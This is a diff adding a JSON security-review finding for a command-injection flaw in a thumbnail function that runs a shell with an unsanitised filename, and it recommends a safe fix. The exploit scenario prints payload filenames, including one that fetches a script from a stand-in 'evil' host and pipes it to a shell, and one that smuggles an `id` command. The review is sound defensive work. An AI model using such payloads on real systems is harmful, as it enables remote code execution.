@@ -1,0 +1,21 @@
+{
+  "findings": [
+    {
+      "file": "app/thumbs.py",
+      "line": 4,
+      "severity": "HIGH",
+      "category": "command_injection",
+      "description": "The `filename` argument is concatenated into a shell command string and run with `shell=True`. Shell metacharacters in the filename (`;`, `&&`, `$()`, backticks, `|`, quotes, newlines) are interpreted by the shell. A filename that comes from an upload, a request parameter, or another user-influenced source can therefore run arbitrary commands.",
+      "exploit_scenario": "An attacker supplies a filename such as `x.jpg; curl http://evil/s.sh | sh #` or `$(id>/tmp/pwn).png`. The shell runs the injected command with the privileges of the application process, which gives remote code execution. A filename that starts with `-` can also inject ImageMagick options. I did not find callers of `make_thumbnail` in this PR, so exploitability depends on the filename being attacker-influenced. User-uploaded filenames are a common source for thumbnail generation.",
+      "recommendation": "Don't use `shell=True`. Pass an argument list: `subprocess.run([\"convert\", \"--\", filename, \"-resize\", \"64x64\", \"thumb.png\"], check=True)`. Validate or normalize the filename, for example with `os.path.basename` plus an allowlist pattern. Generate server-side filenames instead of using user-supplied ones. Write output to a unique, controlled path rather than the fixed `thumb.png`.",
+      "confidence": 0.9
+    }
+  ],
+  "analysis_summary": {
+    "files_reviewed": 1,
+    "high_severity": 1,
+    "medium_severity": 0,
+    "low_severity": 0,
+    "review_completed": true
+  }
+}
